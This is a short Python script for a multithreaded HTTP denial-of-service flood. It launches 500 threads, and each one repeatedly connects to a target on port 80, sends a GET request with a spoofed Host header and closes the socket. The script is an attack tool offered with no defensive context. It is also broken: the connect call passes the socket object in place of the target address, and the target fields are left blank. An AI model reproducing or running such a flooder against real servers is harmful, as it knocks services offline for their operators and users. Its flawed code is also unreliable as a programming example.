#Importing Libraries
import threading
import socket

#defining target IP,port number etc
target=' '
port = 80
fake_ip = ' '

already_connected = 0 

#keep on connecting, sending and closing
def attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((sock,port))            #passing a tuple
        sock.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'),(target, port))
        sock.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))
        sock.close()

        global already_connected
        already_connected += 1
        print(already_connected)

#to fasten our attack
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()